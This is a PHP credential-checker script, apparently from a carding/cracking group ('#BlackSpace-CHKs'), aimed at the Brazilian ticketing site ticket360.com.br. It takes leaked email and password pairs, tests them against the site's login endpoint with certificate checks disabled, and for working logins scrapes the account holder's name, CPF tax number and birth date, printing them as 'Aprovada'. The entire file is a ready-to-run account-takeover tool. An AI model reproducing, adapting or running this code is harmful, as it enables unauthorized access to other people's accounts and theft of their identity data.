<?php
error_reporting(0);
set_time_limit(0);
DeletarCookies();
extract($_GET);
    
    function deletarCookies() {
        if (file_exists("azul.txt")) {
        unlink("azul.txt");
        }
    }
    
    function multiexplode ($delimiters,$string) {
        $ready = str_replace($delimiters, $delimiters[0], $string);
        $launch = explode($delimiters[0], $ready);
        return  $launch;
    }

    list($email, $senha) = multiexplode(array(";","|",":"," » "," "),$linhas);
    
    function dados($string, $start, $end){ 
        $str = explode($start, $string); 
        $str = explode($end, $str[1]); 
        return $str[0]; 
    } //funcao para puxar os dados


        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://www.ticket360.com.br/usuario/login-ajax');
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Host: www.ticket360.com.br',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
        'Accept: application/json, text/javascript, */*; q=0.01',
        'Connection: keep-alive',
        'Referer: https://www.ticket360.com.br/',
        'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
        'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'
        ));
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_NOBODY, false);
        curl_setopt($ch, CURLOPT_ENCODING, "gzip");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/azul.txt');
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/azul.txt');
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'nome='.$email.'&senha='.$senha.'&redirect=&idFacebook=');
        $result2 = curl_exec($ch);

        

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, 'https://www.ticket360.com.br/cadastro');
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Host: www.ticket360.com.br',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Connection: keep-alive',
        'Upgrade-Insecure-Requests: 1',
        'Cache-Control: max-age=0',
        'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
        ));
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_NOBODY, false);
        curl_setopt($ch, CURLOPT_ENCODING, "gzip");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/azul.txt');
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/azul.txt');
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
        curl_setopt($ch, CURLOPT_POST, 0);
        $result = curl_exec($ch); 

        $nome = dados($result, 'type="hidden" name="cli_nome" value="', '"', 1);
        $sobre = dados($result, 'for="cli_sobrenome" class="control-label">Sobrenome:</label>
                    <input type="text"  value="', '"', 1);
        
        $cpf = dados($result, 'for="cli_cpfcnpj" class="control-label">CPF:</label>
                    <input type="text"                            value="','"', 1);
        $data = dados($result, 'for="cli_nascimento" class="control-label">Data de Nascimento:</label>
                    <input type="text" id="cli_nascimento" name="cli_nascimento"
                           value="', '"', 1);
                         

        //echo $result2;



        if (strpos($result, '"/logout"') !== false) {
            echo "<b><i><font style='color: green;'>Aprovada ✔&nbsp;&nbsp;</font></i>  $email|$senha | Nome: $nome $sobre | CPF: $cpf | Data de Nasc: $data | <font style='color: MidnightBlue;'>#BlackSpace-CHKs</font></b>";
        }else{
            echo "<font style='color: red;'>Reprovada ❌</font>  $email|$senha <font style='color: DeepSkyBlue;'></font>";
        }

        if (file_exists(getcwd().'/azul.txt')) {
            unlink(getcwd().'/azul.txt');
        }
?>